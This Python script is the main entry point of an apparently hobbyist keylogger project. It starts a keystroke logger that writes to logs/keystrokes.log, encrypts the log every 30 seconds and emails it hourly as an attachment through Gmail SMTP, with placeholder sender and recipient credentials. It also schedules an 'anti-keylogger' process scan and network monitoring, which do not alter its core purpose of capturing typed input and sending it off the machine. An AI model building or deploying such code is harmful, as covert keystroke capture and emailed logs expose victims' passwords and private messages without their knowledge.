import schedule
import time
from modules.keystroke_logger import KeystrokeLogger
from modules.email_sender import EmailSender
from modules.file_storage import FileStorage
from modules.anti_keylogger import AntiKeylogger

def send_logs():
    sender = EmailSender(
        smtp_server="smtp.gmail.com",
        port=465,
        sender_email="your_email@gmail.com",
        sender_password="your_password"  # Use app-specific password if 2FA is enabled
    )
    sender.send_email(
        recipient_email="recipient_email@gmail.com",
        subject="Keystroke Logs",
        message="Attached are the latest keystroke logs.",
        attachment_path="logs/keystrokes.log"
    )

def detect_suspicious_processes():
    scanner = AntiKeylogger()
    suspicious = scanner.scan_for_keyloggers()
    scanner.display_suspicious_processes()

def main():
    log_file = "logs/keystrokes.log"
    keylogger = KeystrokeLogger(log_file)
    file_storage = FileStorage()
    anti_keylogger = AntiKeylogger()

    print("Keylogger running... Logs will be saved to logs/keystrokes.log")
    
    schedule.every().hour.do(send_logs)  # Send logs every hour
    schedule.every().hour.do(detect_suspicious_processes)  # Scan for keyloggers every hour
    schedule.every(30).seconds.do(file_storage.encrypt_log)  # Encrypt log every 30 seconds
    schedule.every().day.do(anti_keylogger.monitor_network)  # Monitor network every day
    schedule.every().day.do(anti_keylogger.check_file_integrity, file_path="logs/keystrokes.log")  # Check file integrity daily

    # Start the keylogger
    keylogger.start()

    # Run scheduled tasks
    while True:
        schedule.run_pending()
        time.sleep(1)

if __name__ == "__main__":
    main()
